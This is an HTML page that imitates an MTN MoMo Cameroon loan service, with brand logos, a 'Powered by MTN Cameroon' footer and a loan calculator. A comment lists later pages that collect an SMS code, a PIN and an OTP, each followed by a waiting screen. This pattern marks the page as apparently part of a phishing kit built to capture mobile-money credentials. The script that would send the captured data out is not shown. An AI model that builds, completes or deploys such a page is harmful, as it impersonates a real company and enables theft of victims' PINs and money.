<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN MoMo Cameroon – Easy Loans</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="./style.css" />
</head>
<body>

    <!-- PAGE 1: LANDING -->
    <div id="page-landing" class="page active">
        <div class="land-nav">
            <div style="flex:1;"></div>
            <img class="momo-logo-img" src="momo_logo.jpg" alt="MTN MoMo" style="height:60px;" />
            <div style="flex:1;"></div>
            <button class="lang-toggle" onclick="toggleLanguage()">
                <span id="langIcon">🌐 EN</span>
            </button>
        </div>
        <div class="land-center">
            <div class="land-card">
                <h1 data-i18n="welcome">Welcome to MTN MoMo Cameroon</h1>
                <p class="land-tagline" data-i18n="tagline">Get loans easily through MTN MoMo Cameroon</p>
                <div class="calc-box">
                    <h2 data-i18n="calculator">Loan Calculator</h2>
                    <div class="calc-row2"><span data-i18n="amount">Amount</span><span class="cv" id="calcAmt">XAF 1,000,000</span></div>
                    <div class="calc-row2"><span data-i18n="term">Term</span><span class="cv" id="calcTerm">48 Months</span></div>
                    <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000" oninput="updateCalc()" />
                    <div class="range-ends"><span>XAF 500,000</span><span>XAF 5,000,000</span></div>
                    <div class="monthly-box"><span class="ml" data-i18n="monthly">Monthly Payment</span><span class="ma" id="monthlyAmt">XAF 24,000</span></div>
                </div>
                <button class="btn-grad" onclick="startApplication()" data-i18n="start">START APPLICATION</button>
            </div>
        </div>
        <div class="land-footer" data-i18n="footer">© 2026 MTN MoMo Loans – Powered by MTN Cameroon</div>
    </div>

    <!-- PAGE 2: STEP 1 -->
    <div id="page-step1" class="page">
        <nav class="navbar">
            <a class="nav-left" onclick="goTo('page-landing')">← <span data-i18n="back">Back</span></a>
            <img class="momo-logo-img" src="momo_logo.jpg" alt="MTN MoMo" style="height:40px;" />
            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
        </nav>
        <!-- ... (same as before with MoMo logo) -->
    </div>

    <!-- ... other pages (step2, step3, processing, sms, wait sms, pin, wait pin, otp, wait otp, approval, dashboard) ... -->

    <script src="./script.js"></script>
</body>
</html>
